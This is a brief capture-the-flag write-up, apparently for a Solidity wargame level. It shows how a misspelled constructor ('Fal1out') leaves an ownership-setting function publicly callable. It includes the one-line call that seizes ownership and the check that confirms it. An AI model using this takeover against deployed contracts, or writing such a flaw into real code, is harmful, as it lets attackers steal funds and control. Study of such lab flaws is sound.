# Take over ownership of the contract

The only method to switch ownership of contract is inside constructor `Fallout`. 

However the function intended to be constructor has typo:
```
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
  ```

  `Fal1out` has now becomes a public callable function

  We proceed to call the function to take over contract:
  ```
  contract.Fal1out()
  ```

  Verify owner:
  ```
  contract.owner()
  // Output: player address
  ```
